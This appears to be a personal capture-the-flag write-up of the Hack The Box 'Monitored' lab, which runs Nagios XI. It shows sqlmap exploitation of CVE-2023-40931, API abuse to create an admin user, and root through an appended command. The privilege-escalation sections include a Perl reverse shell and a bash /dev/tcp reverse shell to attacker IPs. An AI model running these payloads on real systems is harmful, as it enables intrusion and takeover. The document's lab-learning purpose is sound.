# Savage-Lands : Monitored Writeup

Name: Monitored
Date:  
Difficulty:  Medium
Goals:  
- Find my weak spots
- Testing my recent big methodological praxis and team play 
Learnt:
- Actually hacked an API properly with help.
- API versioning is bad
- Feel very, very slightly more confident with approaching APIs
- READING
	- Read all the scripts see what they do 
	- READ THE ls -la output and think not just the mask or group or user ALL OF IT!
Beyond Root:
- nagiosxi

Towards the end a drink exploded over my keyboard and wrecked it.
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Monitored/Screenshots/ping.png)

No default password [support.nagios.com/forum](https://support.nagios.com/forum/viewtopic.php?t=1175)
```
nagiosadmin : nagiosadmin
nagiosadmin : XjH7VCehowpR1xZB
svc : XjH7VCehowpR1xZB
```

Unfortunately I learnt this later from a team mate about the first one
```php
/nagios // <- correct on
/nagiosxi/login.php
```

```
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-5.10.0-27-amd64 root=UUID=d8761c35-f10f-4e79-b24c-38a65ad7ce1b ro net.ifnames=0 biosdevname=0 quiet
```

Users
```
svc
openldap
```

```
XjH7VCehowpR1xZB
```

```
cat public.snmpbulkwalk| grep 'iso.3.6.1.2.1.25.6.3.1.2.' | awk -F\" '{print $2}' > debian-aptversions.snmp
```
 
## SQLi Exploit to dumping the database

Wolftech0110
- https://outpost24.com/blog/nagios-xi-vulnerabilities/
- https://support.nagios.com/forum/viewtopic.php?f=16&t=58783
```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=XjH7VCehowpR1xZB&valid_min=5'

eb9d746a974f2a8a44af5907bcc1588c132d1f47
```

SQLi against Nagiosxi entails *`xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.*

- SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)
	- `/nagiosxi/admin/banner_message-ajaxhelper.php`
	- `action=acknowledge_banner_message&id=3`

```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=47b79c07a680a3366c203f77ab84babad053e840' --level=5 --risk=3 --batch -p id --random-agent
```

```python
# Target a Parameter
-p $thisIsAwesome
# enumerate Databases
--dbs 
# enumerate tables
--dbms=$databaseType -D $targetDatabase --tables 
# Dump a tables
-D $targetDatabase -T $targetTable --dump
# List columns
-D $targetDatabase -T $targetTable --columns 
# custom queries
--sql-query="select * from master.sys.server_principals"

# Data exfiltration problems
--no-cast
--hex
```

```bash
sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=c9d756eb89729ad6bcdbf56c9b4cdb855f6284a4' --level=5 --risk=3 --batch -p id --random-agent --dbs

sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=c9d756eb89729ad6bcdbf56c9b4cdb855f6284a4' --level=5 --risk=3 --batch -p id --random-agent --dbms=$databaseType -D $targetDatabase --tables 


sqlmap -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=2&token=264623c0d0f26c52058d9af4ecda7ab30a7e7b6c' --level=5 --risk=3 --batch -p id --random-agent -D $targetDatabase -T $targetTable --dump
```


WTF is going on with `sqlmap`
![](sqlmapfinallyworks.png)

![](AMAZING.png)

```
IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
$2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C
```

## Web Access

While to try make this as real as possible I started cracking the hash with hashcat - it is bcrypt so will take atleast 4 hours. In the mean while as I am catching up to my team I have API key, but bare minimum experience hacking APIs let alone successfully. 

https://assets.nagios.com/downloads/nagiosxi/docs/Accessing_The_XI_Backend_API.pdf

https://www.nagios.org/ncpa/help/2.0/api.html and combined with https://support.nagios.com/forum/viewtopic.php?p=260111 and checking with team mates. I got here through teammates and need to reverse enigneer how they got here or I could not forgive myself.
![](usingtheapikey.png)
1. Hint  https://support.nagios.com/forum/viewtopic.php?p=260111, but no user endpoint is stated
2. `ffuf` got benched in the process.

```python

/nagiosxi/api/v1/system/

?apikey=

```

![1080](attemptstillsuccess.png)

My theoretical understanding really came together while think of questions as to how this was suppose to work. I did have hints from team mates. If I had done this live with the other earlier in the week what should have done was:
1. Take a step back
	- What can an Admin do thorough an API that meets objective add a user - it backend api for administration panel
2. What version of the API is accessible and running
3. Consider the directory layout
4. Use clues from forums post if the documentation does not exist
## Foothold

I remember very vaguely doing [THM Nax](https://tryhackme.com/room/nax), there are metasploit modules, but I do not want to use metasploit just yet. A commonality amongst admin panels is functionality to run commands: 
![](commandtestinghey.png)

```bash
curl -L https://assets.nagios.com/downloads/nagiosxi/5/xi-5.11.0.tar.gz -o xi-5.11.0.tar.gz
find nagiosxi/ -type f -name command_test.php 2>/dev/null 
```
![](findingcommandtestphp.png)

I then learnt ccm from team mates is [Core Configuration Manager](https://assets.nagios.com/downloads/nagiosxi/docs/Using-The-Nagios-XI-Core-Config-Manager-For-Host-Management.pdf)
- Check acronyms

After some wondering about why I could not get the Configure tab: 
![1080](authlevelfail.png)

```bash
curl -k -X POST 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1' -d "user_id=7&username=nvm&email=nvm@localhost&name=nvm&password=badadmin&auth_level=admin"
```

I missed 
![](freedocsforexpensivereconerror.png)
This is did not contain as much as I thought
![](nobackenddocshere.png)

Technically another web privilege escalation...
![](functionality.png)

Returning to the help page:
![](differenthelpfordifferentlevels.png)

![](commandofccm.png)

- Navigate to `Configure -> Core Config Manager -> >_Commands`
- Add reverse making sure to use `Command Type: check command`
- Apply configuration
- Navigate to `Monitoring -> Hosts` and select a target
- Run your command with select it with `"Check command" drop down`
- Click `Run Check Command` Button

## Privilege  Escalation 


- sudo is patched for baron edit exploits

- check_icmp, dhcp are suid
- /usr/local/nagiosxi/scripts/automation/ansible/ncpa_autoregister/secrets.yml is readable

https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/


![](suids.png)
Dirty pipe does not work on the SUID that are writable

```bash
cat /etc/cron.d/mrtg
*/5 * * * * root LANG=C LC_ALL=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg --lock-file /var/lib/mrtg/mrtg.lock --confcache-file /var/lib/mrtg/mrtg.ok --user=nagios --group=nagios --user=nagios --group=nagios
```

![](doublecheckingcrons.png)

- `/etc/init.d/nagios` and `ntp` is not existent and the directory is not writable
![](runnopasswd.png)

- /usr/local/nagios/bin/npcd -f /usr/local/nagios/etc/pnp/npcd.cfg is running as nagios...

![](permisssionsofthenopasswd.png)

![](nowritetothescripts.png)


- Cannot configure LDAP 
- `mrtg` did not use additional config as specified in the main configuration
![](nagiosgroupownedfilesanddirs.png)
2
This is weird probably a rabbit hole, but it would be cool to binary patch these - WOW DID not thinking about this more and read that without BinEx stuff in mind 
![](writableexecutables.png)

Not actually writable: - I DID NOT CHECK THE GROUP 
![](notwritableexecutables.png)

Returning to the `mrgt` cron and the `mrtg.cfg`
![](includetheconf.png)

I really hoping this is way forward - it not, but I will put this here regardless:
![](https://www.youtube.com/watch?v=0jK0ytvjv-E)
Just discovered the [HR](https://www.youtube.com/watch?v=l9ksgSuKqkM) one too. Amazing.

mrgt
- Options 
	- LibAdd - add a perl library 

https://linux.die.net/man/1/mrtg-reference
![](ConversionToRoot.png)

```perl
# Force usage of rddtool
LogFormat: rrdtool
# Add a controlled path to rddtool
PathAdd: /dev/shm/
# For style if required persistence by mrtg checking device by non-numeric values
# And because this was the first place to gain code execution why waste 10 minutes
ConversionCode: MyConversions.pl
```

MyConversions.pl
```perl
sub Length2Int {
	my $value = shift;
	use Socket;$i="$ENV{10.10.14.52}";$p=$ENV{8000};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
	return length( $value );
}
```


```
echo "LogFormat: rrdtool" | tee -a /etc/mrtg/conf.d/nvm.cfg
echo "WorkDir: /dev/shm/" | tee -a /etc/mrtg/conf.d/nvm.cfg
echo "PathAdd: /dev/shm/" | tee -a /etc/mrtg/conf.d/nvm.cfg
echo "LibAdd: /dev/shm/" | tee -a /etc/mrtg/conf.d/nvm.cfg
```
No sliver beacon back.

![](permonxi-syscfg.png)

No sudo wildcards

Ansible Vault hash exhausted on rockyou.txt 

`pspy64` - again 
![](rootischeckicmp.png)

![](pathestohijack.png)

You can write to other logged in users with [write.ul](https://manpages.debian.org/testing/bsdextrautils/write.ul.1.en.html):
```
/usr/bin/write.ul # SGID
```


`/usr/local/nagiosxi/html/config.inc.php` `pwd = n@gweb` - neither svc or root, probably nagiosadmin

`/tmp/memcalc`

`/store` - nothing is getting backup - rabbithole - no pspy 

```
/var/lib/mrtg
  Group nagcmd:
/usr/local/nagios/var/rw
```

```
-r-xr-x--- 1 root nagios 3820 Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_ssl_config.sh
-r-xr-x--- 1 root nagios 7861 Nov  9 10:44 /usr/local/nagiosxi/scripts/backup_xi.sh
-r-xr-x--- 1 root nagios 9615 Nov  9 10:44 /usr/local/nagiosxi/scripts/pg2mysql/convert_nagiosxi_to_mysql.php
-r-xr-x--- 1 root nagios 6166 Nov  9 10:44 /usr/local/nagiosxi/scripts/reset_config_perms.sh
-r-xr-x--- 1 root nagios 1654 Nov  9 10:44 /usr/local/nagiosxi/scripts/repair_databases.sh
-r-xr-x--- 1 root nagios 1914 Nov  9 10:44 /usr/local/nagiosxi/scripts/change_timezone.sh
-r-xr-x--- 1 root nagios 1270 Nov  9 10:44 /usr/local/nagiosxi/scripts/import_xiconfig.php
-r-xr-x--- 1 root nagios 3917 Nov  9 10:44 /usr/local/nagiosxi/scripts/manage_services.sh
-r-xr-x--- 1 root nagios 4153 Nov  9 10:44 /usr/local/nagiosxi/scripts/repairmysql.sh
-r-xr-x--- 1 root nagios 2914 Nov  9 10:44 /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
-r-xr-x--- 1 root nagios 1534 Nov  9 10:44 /usr/local/nagiosxi/scripts/send_to_nls.php
-r-xr-x--- 1 root nagios 281115 Nov  9 10:44 /usr/local/nagiosxi/scripts/components/autodiscover_new.php
-r-xr-x--- 1 root nagios 16693 Nov  9 10:44 /usr/local/nagiosxi/scripts/components/getprofile.sh
-r-xr-x--- 1 root nagios 6296 Nov  9 10:44 /usr/local/nagiosxi/scripts/migrate/nagios_bundler.py
-r-xr-x--- 1 root nagios 8612 Nov  9 10:44 /usr/local/nagiosxi/scripts/migrate/migrate.php
-r-xr-x--- 1 root nagios 18851 Nov  9 10:44 /usr/local/nagiosxi/scripts/migrate/nagios_unbundler.py
-r-xr-x--- 1 root nagios 999 Nov  9 10:44 /usr/local/nagiosxi/etc/xi-sys.cfg
-rw-r----- 1 root nagios 33 Jan 18 11:21 /home/nagios/user.txt
```

Check `sudo` whether `secure_path` 
```bash
sudo -l | grep secure_path | awk -F= '{print $2}' | sed 's/\\:/\n/g'
ls -la $ManuallyDirUpAtATime
# Get all file permissions in those directories 
sudo -l | grep secure_path | awk -F= '{print $2}' | sed 's/\\:/\n/g' | xargs -I {} ls -la {}
```


#### ROOT!

After all that the biggest lesson of this box is that I need to make sure I read , even if it probably a false positive
- W means append not just write over a file - depending on group and user ownership you maybe able to append, but not write. 
```bash
echo '/bin/bash -i &>/dev/tcp/10.10.14.71/4442 <&1' | tee -a check_icmp
```
ls -l
![](appendingtocheckicmp.png)


## Post Root Reflection

- Being on team at the time is the best part, catching up is not as fun, but has some merits as to reversing how other found things and what you aren't used to looking for - API docs download in the linked pdf
- READ
- READ
- READ
- Append is another kind of write!

## Beyond Root

Nagios And NagiosXI
```
/nagios
/nagiosxi/login.php
```


- https://support.nagios.com/forum/viewtopic.php?f=16&t=58783
```bash
curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=nagiosadmin&valid_min=5'
```

[Outpost24 Ghost Labs Vulnerability Research department - Nagios xi vulnerabilities](https://outpost24.com/blog/nagios-xi-vulnerabilities/)
SQLi against Nagiosxi  entails *`xi_session` and `xi_users` table containing data such as emails, usernames, hashed passwords, API tokens, and backend tickets.*
- SQL Injection in Banner acknowledging endpoint (CVE-2023-40931)
	- `/nagiosxi/admin/banner_message-ajaxhelper.php`
	- `action=acknowledge_banner_message&id=3`
- SQL Injection in Host/Service Escalation in CCM (CVE-2023-40934)
	- requires additional privileges
	- `/nagiosxi/includes/components/ccm/index.php`
	- `tfFirstNotif`, `tfLastNotif`, and `tfNotifInterval` are assumed to be trusted
- SQL Injection in Announcement Banner Settings (CVE-2023-40933)
	- requires additional privileges
	- `/nagiosxi/admin/banner message-ajaxhelper.php`
	- `update_banner_message_settings` action on the affected endpoint, the `id` parameter is assumed to be trusted
- Cross-Site Scripting in Custom Logo Component (CVE-2023-40932)
	- Custom Logos will displayed across an entire product!
	- Inject arbitrary JavaScript that will then be evaluated in any users’ browser that browses to a page with that logo


https://blog.grimm-co.com/2021/11/escalating-xss-to-sainthood-with-nagios.html

https://packetstormsecurity.com/files/165978/Nagios-XI-Autodiscovery-Shell-Upload.html

https://skylightcyber.com/2021/05/20/13-nagios-vulnerabilities-7-will-shock-you/

https://www.anitian.com/hacking-nagios/

https://github.com/dennyzhang/cheatsheet.dennyzhang.com/blob/master/cheatsheet-nagios-A4/cheatsheet-nagios-A4.pdf

https://i-am-takuma.medium.com/sqlmap-cheat-sheet-8dc29054528c